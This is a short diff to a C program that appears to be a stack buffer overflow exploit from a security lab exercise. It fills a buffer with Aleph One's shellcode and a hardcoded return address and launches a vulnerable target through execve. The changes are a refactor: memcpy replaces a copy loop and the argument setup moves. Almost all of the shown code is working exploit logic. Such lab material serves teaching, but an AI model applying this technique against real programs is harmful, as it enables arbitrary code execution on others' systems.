@@ -17,17 +17,12 @@
  *     (starting point of shellcode).
  */
 
-int main(void)
+int main (void)
 {
   char *args[3];
   char *env[1];
-
-  args[0] = TARGET; args[2] = NULL;
-  env[0] = NULL;
-
   long buffAddr, *addrPtr;
   char egg[EGG_SIZE]; /* string containing exploit code */
-  char *ptr;
   int i;
 
   buffAddr = 0xBFFFFC08; /* start address of buf in target1.c:foo */
@@ -41,15 +36,15 @@ int main(void)
   
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = egg;
-  for (i = 0; i < strlen(shellcode); i++)
-    ptr[i] = shellcode[i];
+  memcpy (egg, shellcode, strlen (shellcode));
 
   egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
-  args[1] = egg;
+  
+  args[0] = TARGET; args[1] = egg; args[2] = NULL;
+  env[0] = NULL;
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+  if (0 > execve (TARGET, args, env))
+    fprintf (stderr, "execve failed.\n");
 
   return 0;
 }
